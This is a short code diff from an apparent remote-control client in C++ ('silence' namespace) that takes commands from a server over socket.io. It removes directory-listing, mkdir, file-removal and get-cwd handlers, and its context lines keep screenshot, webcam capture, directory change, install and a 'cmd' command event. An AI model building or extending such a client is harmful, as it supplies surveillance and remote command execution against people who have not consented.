@@ -80,16 +80,8 @@ namespace silence {
             screenshotEvent();
         else if (event == "webcamshot")
             webcamShotEvent();
-        else if (event == "listdir")
-            listDirEvent(commandObject);
-        else if (event == "mkdir")
-            mkDirEvent(commandObject);
-        else if (event == "remove")
-            removeEvent(commandObject);
         else if (event == "cd")
             cdEvent(commandObject);
-        else if (event == "get_cwd")
-            getCwdEvent(commandObject);
         else if (event == "install_dir")
             installDirEvent(commandObject);
         else if (event == "cmd")
@@ -161,23 +153,6 @@ namespace silence {
         }
     }
 
-    void Client::listDirEvent(const CommandObject &object) {
-        auto dirList = sio::array_message::create();
-        for (const auto &path : impl::listdir(object.at("path")->get_string()))
-            dirList->get_vector().push_back(SIOSTR(path.string()));
-
-        response("listdir", dirList);
-    }
-
-    void Client::mkDirEvent(const CommandObject &object) {
-        response("mkdir",
-                 SIOBOOL(fs::create_directories(object.at("path")->get_string())));
-    }
-
-    void Client::removeEvent(const CommandObject &object) {
-        response("remove", SIOBOOL(fs::remove(object.at("path")->get_string())));
-    }
-
     void Client::cdEvent(const CommandObject &object) {
         fs::path path{object.at("path")->get_string()};
 
@@ -186,10 +161,6 @@ namespace silence {
         else
             fs::current_path(fs::current_path() / path);
         response("cd", SIOBOOL("True"));
-    }
-
-    void Client::getCwdEvent(const Client::CommandObject &object) {
-        response("get_cwd", SIOSTR(fs::current_path()));
     }
 
     void Client::installDirEvent(const Client::CommandObject &object) {
